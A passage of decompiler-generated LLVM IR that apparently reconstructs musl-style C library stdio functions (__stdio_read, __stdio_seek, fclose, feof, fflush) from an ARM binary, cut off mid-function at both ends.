  store i32 59724, i32* %v3_e824, align 4
  %v0_e82c = load i32, i32* %r8.global-to-local, align 4
  %v1_e82c = add i32 %v0_e82c, 8
  store i32 %v1_e82c, i32* %r2.global-to-local, align 4
  %v0_e830 = load i32, i32* @r6, align 4
  %v1_e830 = add i32 %v0_e830, -8
  store i32 %v1_e830, i32* %r1.global-to-local, align 4
  %v1_e834 = load i32, i32* @r5, align 4
  %v2_e834 = add i32 %v1_e834, 12
  %v3_e834 = inttoptr i32 %v2_e834 to i32*
  store i32 59492, i32* %v3_e834, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_e83c = load i32, i32* %r2.global-to-local, align 4
  %v1_e83c = load i32, i32* @r5, align 4
  %v2_e83c = add i32 %v1_e83c, 44
  %v3_e83c = inttoptr i32 %v2_e83c to i32*
  store i32 %v0_e83c, i32* %v3_e83c, align 4
  %v0_e840 = load i32, i32* %r1.global-to-local, align 4
  %v1_e840 = load i32, i32* @r5, align 4
  %v2_e840 = add i32 %v1_e840, 48
  %v3_e840 = inttoptr i32 %v2_e840 to i32*
  store i32 %v0_e840, i32* %v3_e840, align 4
  %v0_e844 = load i32, i32* %r3.global-to-local, align 4
  %v1_e844 = load i32, i32* @r5, align 4
  %v2_e844 = add i32 %v1_e844, 76
  %v3_e844 = inttoptr i32 %v2_e844 to i32*
  store i32 %v0_e844, i32* %v3_e844, align 4
  %v0_e848.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_e848

dec_label_pc_e848:                                ; preds = %.thread, %dec_label_pc_e800
  %v0_e848 = phi i32 [ 0, %.thread ], [ %v0_e848.pre, %dec_label_pc_e800 ]
  %v2_e84c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_e84c, i32* @r4, align 4
  store i32 %v6_e7b8, i32* @r5, align 4
  store i32 %v9_e7b8, i32* @r6, align 4
  store i32 %v12_e7b8, i32* @r7, align 4
  ret i32 %v0_e848

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_e848, { 1, 0 }
}

define i32 @_dummy.4(i32 %arg1) local_unnamed_addr {
entry:
  %v1_e860 = load i32, i32* @r0, align 4
  ret i32 %v1_e860
}

define i32 @__stdio_close(i32 %arg1) local_unnamed_addr {
entry:
  %v1_e86c = add i32 %arg1, 60
  %v2_e86c = inttoptr i32 %v1_e86c to i32*
  %v3_e86c = load i32, i32* %v2_e86c, align 4
  store i32 %v3_e86c, i32* @r0, align 4
  %v2_e874 = call i32 @_dummy.4(i32 %v3_e86c)
  store i32 %v2_e874, i32* @r0, align 4
  %v0_e880 = call i32 @__syscall_ret()
  ret i32 %v0_e880
}

define i32 @__stdio_read(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  store i32 %tmp, i32* @r4, align 4
  %v1_e898 = add i32 %tmp, 48
  %v2_e898 = inttoptr i32 %v1_e898 to i32*
  %v3_e898 = load i32, i32* %v2_e898, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_e8a0 = ptrtoint i32* %stack_var_-40 to i32
  %v2_e8a4 = icmp eq i32 %v3_e898, 0
  store i1 %v2_e8a4, i1* %cpsr_z.global-to-local, align 1
  %not.v2_e8a4 = xor i1 %v2_e8a4, true
  %v2_e8ac = sext i1 %not.v2_e8a4 to i32
  %storemerge = add i32 %v2_e8ac, %arg3
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v1_e8b0 = add i32 %tmp, 44
  %v2_e8b0 = inttoptr i32 %v1_e8b0 to i32*
  %v3_e8b0 = load i32, i32* %v2_e8b0, align 4
  store i32 %v3_e8b0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-40, align 4
  %v1_e8cc = add i32 %tmp, 60
  %v2_e8cc = inttoptr i32 %v1_e8cc to i32*
  %v3_e8cc = load i32, i32* %v2_e8cc, align 4
  store i32 %v3_e8cc, i32* @r0, align 4
  store i32 %v2_e8a0, i32* %r1.global-to-local, align 4
  store i32 2, i32* @r2, align 4
  %v0_e8dc = call i32 @__syscall_ret()
  %v2_e8e0 = icmp eq i32 %v0_e8dc, 0
  store i1 %v2_e8e0, i1* %cpsr_z.global-to-local, align 1
  %v5_e8e4 = icmp sgt i32 %v0_e8dc, 0
  br i1 %v5_e8e4, label %dec_label_pc_e904, label %dec_label_pc_e8e8

dec_label_pc_e8e8:                                ; preds = %entry
  %v0_e8e8 = load i32, i32* @r4, align 4
  %v1_e8e8 = inttoptr i32 %v0_e8e8 to i32*
  %v2_e8e8 = load i32, i32* %v1_e8e8, align 4
  %v1_e8ec = and i32 %v0_e8dc, 48
  %v1_e8f0 = xor i32 %v1_e8ec, 16
  store i32 %v1_e8f0, i32* %r3.global-to-local, align 4
  %v2_e8f4 = or i32 %v2_e8e8, %v1_e8f0
  store i32 %v2_e8f4, i32* %r2.global-to-local, align 4
  store i32 %v0_e8dc, i32* %r5.global-to-local, align 4
  store i32 %v2_e8f4, i32* %v1_e8e8, align 4
  br label %.thread3

dec_label_pc_e904:                                ; preds = %entry
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v9_e908 = icmp eq i32 %v0_e8dc, %storemerge
  store i1 %v9_e908, i1* %cpsr_z.global-to-local, align 1
  %tmp19 = icmp ugt i32 %v0_e8dc, %storemerge
  br i1 %tmp19, label %dec_label_pc_e914, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_e904
  store i32 %v0_e8dc, i32* %r5.global-to-local, align 4
  br label %.thread3

dec_label_pc_e914:                                ; preds = %dec_label_pc_e904
  %v2_e908 = sub i32 %v0_e8dc, %storemerge
  %v0_e914 = load i32, i32* @r4, align 4
  %v1_e914 = add i32 %v0_e914, 44
  %v2_e914 = inttoptr i32 %v1_e914 to i32*
  %v3_e914 = load i32, i32* %v2_e914, align 4
  store i32 %v3_e914, i32* %r1.global-to-local, align 4
  %v2_e91c = add i32 %v2_e908, %v3_e914
  store i32 %v2_e91c, i32* %r3.global-to-local, align 4
  %v1_e920 = add i32 %v0_e914, 48
  %v2_e920 = inttoptr i32 %v1_e920 to i32*
  %v3_e920 = load i32, i32* %v2_e920, align 4
  store i32 %v3_e920, i32* %r2.global-to-local, align 4
  %v1_e924 = add i32 %v0_e914, 4
  %v2_e924 = inttoptr i32 %v1_e924 to i32*
  store i32 %v3_e914, i32* %v2_e924, align 4
  %v4_e924 = add i32 %v0_e914, 8
  %v5_e924 = inttoptr i32 %v4_e924 to i32*
  %v6_e924 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_e924, i32* %v5_e924, align 4
  %v0_e928 = load i32, i32* %r2.global-to-local, align 4
  %v2_e928 = icmp eq i32 %v0_e928, 0
  store i1 %v2_e928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e928, label %.thread3, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_e914
  %v1_e92c = load i32, i32* %r1.global-to-local, align 4
  %v2_e92c = inttoptr i32 %v1_e92c to i8*
  %v3_e92c = load i8, i8* %v2_e92c, align 1
  %v4_e92c = zext i8 %v3_e92c to i32
  store i32 %v4_e92c, i32* %r2.global-to-local, align 4
  %v6_e92c = add i32 %v1_e92c, 1
  store i32 %v6_e92c, i32* %r1.global-to-local, align 4
  %v1_e930 = load i32, i32* %r6.global-to-local, align 4
  %v2_e930 = load i32, i32* %r5.global-to-local, align 4
  %v3_e930 = add i32 %v2_e930, %v1_e930
  store i32 %v3_e930, i32* %r3.global-to-local, align 4
  %v4_e934 = add i32 %v3_e930, -1
  %v5_e934 = inttoptr i32 %v4_e934 to i8*
  store i8 %v3_e92c, i8* %v5_e934, align 1
  %v0_e938.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e938.pr.pr, label %.thread3, label %bb18

bb18:                                             ; preds = %.thread2
  %v1_e938 = load i32, i32* %r1.global-to-local, align 4
  %v2_e938 = load i32, i32* @r4, align 4
  %v3_e938 = add i32 %v2_e938, 4
  %v4_e938 = inttoptr i32 %v3_e938 to i32*
  store i32 %v1_e938, i32* %v4_e938, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread5, %dec_label_pc_e914, %dec_label_pc_e8e8, %.thread2, %bb18
  %v0_e93c = load i32, i32* %r5.global-to-local, align 4
  ret i32 %v0_e93c

; uselistorder directives
  uselistorder i32 %v3_e914, { 1, 0, 2 }
  uselistorder i32 %v0_e914, { 1, 2, 0, 3 }
  uselistorder i32 %v0_e8dc, { 4, 3, 0, 5, 2, 1, 6, 7 }
  uselistorder i32 %storemerge, { 3, 0, 2, 1, 4 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread3, { 4, 3, 1, 0, 2 }
}

define i32 @__stdio_seek(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v1_e95c = add i32 %arg1, 60
  %v2_e95c = inttoptr i32 %v1_e95c to i32*
  %v3_e95c = load i32, i32* %v2_e95c, align 4
  store i32 %v3_e95c, i32* @r0, align 4
  store i32 %arg3, i32* @r4, align 4
  %v0_e970 = call i32 @__syscall_ret()
  %v1_e974 = icmp slt i32 %v0_e970, 0
  br i1 %v1_e974, label %bb, label %._crit_edge

._crit_edge:                                      ; preds = %entry
  %v2_e984.pre = load i32, i32* %stack_var_-24, align 4
  br label %bb7

bb:                                               ; preds = %entry
  store i32 -1, i32* %stack_var_-24, align 4
  br label %bb7

bb7:                                              ; preds = %._crit_edge, %bb
  %v2_e984 = phi i32 [ -1, %bb ], [ %v2_e984.pre, %._crit_edge ]
  ret i32 %v2_e984

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @_dummy.5(i32 %arg1) local_unnamed_addr {
entry:
  %v1_e994 = load i32, i32* @r0, align 4
  ret i32 %v1_e994
}

define i32 @fclose(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_e998 = add i32 %tmp, 76
  %v2_e998 = inttoptr i32 %v1_e998 to i32*
  %v3_e998 = load i32, i32* %v2_e998, align 4
  %v1_e99c = icmp slt i32 %v3_e998, 0
  %v3_e9a0 = load i32, i32* @r4, align 4
  store i32 %v3_e9a0, i32* %stack_var_-24, align 4
  %v6_e9a0 = load i32, i32* @r5, align 4
  %v9_e9a0 = load i32, i32* @r6, align 4
  %v12_e9a0 = load i32, i32* @r7, align 4
  %v15_e9a0 = load i32, i32* @r8, align 4
  %v18_e9a0 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  br i1 %v1_e99c, label %.thread7, label %dec_label_pc_e9b0

.thread7:                                         ; preds = %entry
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_e9b8

dec_label_pc_e9b0:                                ; preds = %entry
  %v0_e9b0 = call i32 @__lockfile()
  store i32 %v0_e9b0, i32* @r8, align 4
  %v0_e9bc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e9b8

dec_label_pc_e9b8:                                ; preds = %.thread7, %dec_label_pc_e9b0
  %v0_e9bc = phi i32 [ %v0_e9bc.pre, %dec_label_pc_e9b0 ], [ %tmp, %.thread7 ]
  store i32 %v0_e9bc, i32* @r0, align 4
  store i32 59848, i32* @lr, align 4
  %v2_e9c4 = call i32 @_dummy.5(i32 %v0_e9bc)
  %v0_e9c8 = load i32, i32* @r4, align 4
  %v1_e9c8 = inttoptr i32 %v0_e9c8 to i32*
  %v2_e9c8 = load i32, i32* %v1_e9c8, align 4
  %v1_e9cc = urem i32 %v2_e9c8, 2
  store i32 %v1_e9cc, i32* @r7, align 4
  %v2_e9cc = icmp eq i32 %v1_e9cc, 0
  br i1 %v2_e9cc, label %dec_label_pc_e9d4, label %dec_label_pc_ea0c

dec_label_pc_e9d4:                                ; preds = %dec_label_pc_e9b8
  %v0_e9d4 = call i32 @__ofl_lock()
  %v0_e9d8 = load i32, i32* @r4, align 4
  %v1_e9d8 = add i32 %v0_e9d8, 52
  %v2_e9d8 = inttoptr i32 %v1_e9d8 to i32*
  %v3_e9d8 = load i32, i32* %v2_e9d8, align 4
  %v2_e9dc = icmp eq i32 %v3_e9d8, 0
  br i1 %v2_e9dc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_e9d4
  %v2_e9e0 = add i32 %v0_e9d8, 56
  %v3_e9e0 = inttoptr i32 %v2_e9e0 to i32*
  %v4_e9e0 = load i32, i32* %v3_e9e0, align 4
  %v3_e9e4 = add i32 %v3_e9d8, 56
  %v4_e9e4 = inttoptr i32 %v3_e9e4 to i32*
  store i32 %v4_e9e0, i32* %v4_e9e4, align 4
  %v0_e9e8.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e9d4, %bb
  %v1_e9f0 = phi i32 [ %v0_e9d8, %dec_label_pc_e9d4 ], [ %v0_e9e8.pre, %bb ]
  %v1_e9e8 = add i32 %v1_e9f0, 56
  %v2_e9e8 = inttoptr i32 %v1_e9e8 to i32*
  %v3_e9e8 = load i32, i32* %v2_e9e8, align 4
  %v2_e9ec = icmp eq i32 %v3_e9e8, 0
  br i1 %v2_e9ec, label %.thread1, label %bb15

bb15:                                             ; preds = %.thread
  %v2_e9f0 = add i32 %v1_e9f0, 52
  %v3_e9f0 = inttoptr i32 %v2_e9f0 to i32*
  %v4_e9f0 = load i32, i32* %v3_e9f0, align 4
  %v3_e9f4 = add i32 %v3_e9e8, 52
  %v4_e9f4 = inttoptr i32 %v3_e9f4 to i32*
  store i32 %v4_e9f0, i32* %v4_e9f4, align 4
  %v1_e9fc.pre = load i32, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread, %bb15
  %v1_ea00 = phi i32 [ %v1_e9f0, %.thread ], [ %v1_e9fc.pre, %bb15 ]
  %v1_e9f8 = inttoptr i32 %v0_e9d4 to i32*
  %v2_e9f8 = load i32, i32* %v1_e9f8, align 4
  %v9_e9fc = icmp eq i32 %v2_e9f8, %v1_ea00
  br i1 %v9_e9fc, label %bb16, label %.thread2

bb16:                                             ; preds = %.thread1
  %v2_ea00 = add i32 %v1_ea00, 56
  %v3_ea00 = inttoptr i32 %v2_ea00 to i32*
  %v4_ea00 = load i32, i32* %v3_ea00, align 4
  store i32 %v4_ea00, i32* %v1_e9f8, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread1, %bb16
  %v0_ea08 = call i32 @__ofl_unlock()
  %v0_ea0c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ea0c

dec_label_pc_ea0c:                                ; preds = %dec_label_pc_e9b8, %.thread2
  %v0_ea0c = phi i32 [ %v0_e9c8, %dec_label_pc_e9b8 ], [ %v0_ea0c.pre, %.thread2 ]
  store i32 %v0_ea0c, i32* @r0, align 4
  %v1_ea10 = call i32 @fflush(i32 %v0_ea0c)
  store i32 %v1_ea10, i32* @r6, align 4
  %v0_ea18 = load i32, i32* @r4, align 4
  %v1_ea1c = add i32 %v0_ea18, 12
  %v2_ea1c = inttoptr i32 %v1_ea1c to i32*
  %v3_ea1c = load i32, i32* %v2_ea1c, align 4
  call void @__pseudo_branch(i32 %v3_ea1c)
  store i32 %v0_ea18, i32* @r5, align 4
  %v0_ea2c = load i32, i32* @r4, align 4
  %v1_ea2c = add i32 %v0_ea2c, 96
  %v2_ea2c = inttoptr i32 %v1_ea2c to i32*
  %v3_ea2c = load i32, i32* %v2_ea2c, align 4
  store i32 59960, i32* @lr, align 4
  %v1_ea34 = icmp ne i32 %v3_ea2c, 0
  call void @__pseudo_cond_branch(i1 %v1_ea34, i32 ptrtoint (i32* @global_var_b3e8.553 to i32))
  %v0_ea38 = load i32, i32* @r7, align 4
  %v2_ea38 = icmp eq i32 %v0_ea38, 0
  br i1 %v2_ea38, label %dec_label_pc_ea40, label %dec_label_pc_ea4c

dec_label_pc_ea40:                                ; preds = %dec_label_pc_ea0c
  %v0_ea40 = load i32, i32* @r4, align 4
  %v1_ea44 = call i32 @free(i32 %v0_ea40)
  br label %dec_label_pc_ea58

dec_label_pc_ea4c:                                ; preds = %dec_label_pc_ea0c
  %v0_ea4c = load i32, i32* @r8, align 4
  %v2_ea4c = icmp eq i32 %v0_ea4c, 0
  br i1 %v2_ea4c, label %bb18, label %bb17

bb17:                                             ; preds = %dec_label_pc_ea4c
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_ea4c, %bb17
  %v1_ea54 = xor i1 %v2_ea4c, true
  call void @__pseudo_cond_branch(i1 %v1_ea54, i32 ptrtoint (i32* @global_var_12da8.554 to i32))
  br label %dec_label_pc_ea58

dec_label_pc_ea58:                                ; preds = %dec_label_pc_ea40, %bb18
  %v0_ea58 = load i32, i32* @r5, align 4
  %v1_ea58 = load i32, i32* @r6, align 4
  %v2_ea58 = or i32 %v1_ea58, %v0_ea58
  %v2_ea5c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_ea5c, i32* @r4, align 4
  store i32 %v6_e9a0, i32* @r5, align 4
  store i32 %v9_e9a0, i32* @r6, align 4
  store i32 %v12_e9a0, i32* @r7, align 4
  store i32 %v15_e9a0, i32* @r8, align 4
  store i32 %v18_e9a0, i32* @lr, align 4
  ret i32 %v2_ea58

; uselistorder directives
  uselistorder i32 %v0_ea0c, { 1, 0 }
  uselistorder i32 %v1_e9cc, { 1, 0 }
  uselistorder i32 %v0_e9bc, { 1, 0 }
  uselistorder i32 (i32)* @free, { 4, 0, 9, 8, 7, 1, 6, 2, 5, 3 }
  uselistorder label %dec_label_pc_ea58, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_ea0c, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_e9b8, { 1, 0 }
}

define i32 @feof(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_ea68 = load i32, i32* @r4, align 4
  store i32 %v3_ea68, i32* %stack_var_-12, align 4
  %v0_ea6c = load i32, i32* %r0.global-to-local, align 4
  %v1_ea6c = add i32 %v0_ea6c, 76
  %v2_ea6c = inttoptr i32 %v1_ea6c to i32*
  %v3_ea6c = load i32, i32* %v2_ea6c, align 4
  %v1_ea70 = icmp slt i32 %v3_ea6c, 0
  store i32 %v0_ea6c, i32* %r4.global-to-local, align 4
  br i1 %v1_ea70, label %bb, label %bb6

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v3_ea80 = xor i1 %v1_ea70, true
  call void @__pseudo_cond_branch(i1 %v3_ea80, i32 ptrtoint (i32* @global_var_12e08.555 to i32))
  %v0_ea84 = load i32, i32* %r0.global-to-local, align 4
  %v2_ea84 = icmp eq i32 %v0_ea84, 0
  %v0_ea88 = load i32, i32* %r4.global-to-local, align 4
  %v1_ea88 = inttoptr i32 %v0_ea88 to i32*
  %v2_ea88 = load i32, i32* %v1_ea88, align 4
  store i32 %v2_ea88, i32* %r5.global-to-local, align 4
  br i1 %v2_ea84, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 %v0_ea88, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  %v1_ea90 = xor i1 %v2_ea84, true
  call void @__pseudo_cond_branch(i1 %v1_ea90, i32 ptrtoint (i32* @global_var_12da8.554 to i32))
  %v0_ea94 = load i32, i32* %r5.global-to-local, align 4
  %v3_ea94 = udiv i32 %v0_ea94, 16
  %v1_ea98 = urem i32 %v3_ea94, 2
  store i32 %v1_ea98, i32* %r0.global-to-local, align 4
  %v2_eaa0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_eaa0, i32* @r4, align 4
  ret i32 %v1_ea98

; uselistorder directives
  uselistorder i32 %v1_ea98, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__fflush_unlocked(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_eaa8 = load i32, i32* @r4, align 4
  store i32 %v3_eaa8, i32* %stack_var_-8, align 4
  %v0_eaac = load i32, i32* %r0.global-to-local, align 4
  %v1_eaac = add i32 %v0_eaac, 20
  %v2_eaac = inttoptr i32 %v1_eaac to i32*
  %v3_eaac = load i32, i32* %v2_eaac, align 4
  %v1_eab0 = add i32 %v0_eaac, 28
  %v2_eab0 = inttoptr i32 %v1_eab0 to i32*
  %v3_eab0 = load i32, i32* %v2_eab0, align 4
  store i32 %v3_eab0, i32* %r3.global-to-local, align 4
  store i32 %v0_eaac, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v3_eaac, %v3_eab0
  br i1 %tmp, label %dec_label_pc_eac4, label %dec_label_pc_eae8

dec_label_pc_eac4:                                ; preds = %entry
  store i32 0, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  %v1_eacc = add i32 %v0_eaac, 36
  %v2_eacc = inttoptr i32 %v1_eacc to i32*
  %v3_eacc = load i32, i32* %v2_eacc, align 4
  call void @__pseudo_branch(i32 %v3_eacc)
  %v0_ead8 = load i32, i32* %r4.global-to-local, align 4
  %v1_ead8 = add i32 %v0_ead8, 20
  %v2_ead8 = inttoptr i32 %v1_ead8 to i32*
  %v3_ead8 = load i32, i32* %v2_ead8, align 4
  store i32 %v3_ead8, i32* %r3.global-to-local, align 4
  %v2_eadc = icmp eq i32 %v3_ead8, 0
  br i1 %v2_eadc, label %dec_label_pc_eb34, label %dec_label_pc_eae8

dec_label_pc_eae8:                                ; preds = %entry, %dec_label_pc_eac4
  %v0_eb0c = phi i32 [ %v0_ead8, %dec_label_pc_eac4 ], [ %v0_eaac, %entry ]
  %v1_eae8 = add i32 %v0_eb0c, 4
  %v2_eae8 = inttoptr i32 %v1_eae8 to i32*
  %v3_eae8 = load i32, i32* %v2_eae8, align 4
  store i32 %v3_eae8, i32* %r3.global-to-local, align 4
  %v1_eaec = add i32 %v0_eb0c, 8
  %v2_eaec = inttoptr i32 %v1_eaec to i32*
  %v3_eaec = load i32, i32* %v2_eaec, align 4
  store i32 %v3_eaec, i32* @r2, align 4
  %v2_eaf0 = sub i32 %v3_eae8, %v3_eaec
  %v3_eaf0 = icmp ult i32 %v3_eae8, %v3_eaec
  br i1 %v3_eaf0, label %dec_label_pc_eaf8, label %dec_label_pc_eb18

dec_label_pc_eaf8:                                ; preds = %dec_label_pc_eae8
  store i32 %v2_eaf0, i32* @r2, align 4
  store i32 %v0_eb0c, i32* %r0.global-to-local, align 4
  %v3_eb08 = ashr i32 %v2_eaf0, 31
  store i32 %v3_eb08, i32* %r3.global-to-local, align 4
  %v1_eb0c = add i32 %v0_eb0c, 40
  %v2_eb0c = inttoptr i32 %v1_eb0c to i32*
  %v3_eb0c = load i32, i32* %v2_eb0c, align 4
  call void @__pseudo_branch(i32 %v3_eb0c)
  %v1_eb1c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_eb18

dec_label_pc_eb18:                                ; preds = %dec_label_pc_eae8, %dec_label_pc_eaf8
  %v1_eb1c = phi i32 [ %v0_eb0c, %dec_label_pc_eae8 ], [ %v1_eb1c.pre, %dec_label_pc_eaf8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_eb1c = add i32 %v1_eb1c, 4
  %v3_eb1c = inttoptr i32 %v2_eb1c to i32*
  store i32 0, i32* %v3_eb1c, align 4
  %v0_eb20 = load i32, i32* %r3.global-to-local, align 4
  %v1_eb20 = load i32, i32* %r4.global-to-local, align 4
  %v2_eb20 = add i32 %v1_eb20, 16
  %v3_eb20 = inttoptr i32 %v2_eb20 to i32*
  store i32 %v0_eb20, i32* %v3_eb20, align 4
  %v0_eb24 = load i32, i32* %r3.global-to-local, align 4
  %v1_eb24 = load i32, i32* %r4.global-to-local, align 4
  %v2_eb24 = add i32 %v1_eb24, 28
  %v3_eb24 = inttoptr i32 %v2_eb24 to i32*
  store i32 %v0_eb24, i32* %v3_eb24, align 4
  %v0_eb28 = load i32, i32* %r3.global-to-local, align 4
  %v1_eb28 = load i32, i32* %r4.global-to-local, align 4
  %v2_eb28 = add i32 %v1_eb28, 20
  %v3_eb28 = inttoptr i32 %v2_eb28 to i32*
  store i32 %v0_eb28, i32* %v3_eb28, align 4
  %v0_eb2c = load i32, i32* %r3.global-to-local, align 4
  %v1_eb2c = load i32, i32* %r4.global-to-local, align 4
  %v2_eb2c = add i32 %v1_eb2c, 8
  %v3_eb2c = inttoptr i32 %v2_eb2c to i32*
  store i32 %v0_eb2c, i32* %v3_eb2c, align 4
  %v0_eb30 = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_eb34

dec_label_pc_eb34:                                ; preds = %dec_label_pc_eac4, %dec_label_pc_eb18
  %storemerge = phi i32 [ %v0_eb30, %dec_label_pc_eb18 ], [ -1, %dec_label_pc_eac4 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_eb38 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_eb38, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_eaf0, { 1, 0 }
  uselistorder i32 %v3_eaec, { 1, 0, 2 }
  uselistorder i32 %v3_eae8, { 1, 0, 2 }
  uselistorder i32 %v0_eb0c, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_eb34, { 1, 0 }
  uselistorder label %dec_label_pc_eb18, { 1, 0 }
  uselistorder label %dec_label_pc_eae8, { 1, 0 }
}

define i32 @fflush(i32 %arg1) local_unnamed_addr {
bb:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_eb40.pre = load i32, i32* @sp, align 4
  %v3_eb40.pre = load i32, i32* @r4, align 4
  br label %entry

entry:                                            ; preds = %bb19, %bb
  %v3_eb40 = phi i32 [ 0, %bb19 ], [ %v3_eb40.pre, %bb ]
  %v0_eb40 = phi i32 [ %v1_eb48, %bb19 ], [ %v0_eb40.pre, %bb ]
  %v1_eb40 = add i32 %v0_eb40, -20
  %v2_eb40 = inttoptr i32 %v1_eb40 to i32*
  store i32 %v3_eb40, i32* %v2_eb40, align 4
  %v4_eb40 = add i32 %v0_eb40, -16
  %v5_eb40 = inttoptr i32 %v4_eb40 to i32*
  %v6_eb40 = load i32, i32* @r5, align 4
  store i32 %v6_eb40, i32* %v5_eb40, align 4
  %v7_eb40 = add i32 %v0_eb40, -12
  %v8_eb40 = inttoptr i32 %v7_eb40 to i32*
  %v9_eb40 = load i32, i32* @r6, align 4
  store i32 %v9_eb40, i32* %v8_eb40, align 4
  %v10_eb40 = add i32 %v0_eb40, -8
  %v11_eb40 = inttoptr i32 %v10_eb40 to i32*
  %v12_eb40 = load i32, i32* @r7, align 4
  store i32 %v12_eb40, i32* %v11_eb40, align 4
  %v13_eb40 = add i32 %v0_eb40, -4
  %v14_eb40 = inttoptr i32 %v13_eb40 to i32*
  %v15_eb40 = load i32, i32* @lr, align 4
  store i32 %v15_eb40, i32* %v14_eb40, align 4
  %v0_eb44 = load i32, i32* @r0, align 4
  store i32 %v0_eb44, i32* @r4, align 4
  %v2_eb44 = icmp eq i32 %v0_eb44, 0
  %v1_eb48 = add i32 %v0_eb40, -24
  br i1 %v2_eb44, label %dec_label_pc_eb88, label %dec_label_pc_eb50

dec_label_pc_eb50:                                ; preds = %entry
  %v1_eb50 = add i32 %v0_eb44, 76
  %v2_eb50 = inttoptr i32 %v1_eb50 to i32*
  %v3_eb50 = load i32, i32* %v2_eb50, align 4
  %v1_eb54 = icmp slt i32 %v3_eb50, 0
  br i1 %v1_eb54, label %.thread18, label %dec_label_pc_eb60

.thread18:                                        ; preds = %dec_label_pc_eb50
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_eb68

dec_label_pc_eb60:                                ; preds = %dec_label_pc_eb50
  %v0_eb60 = call i32 @__lockfile()
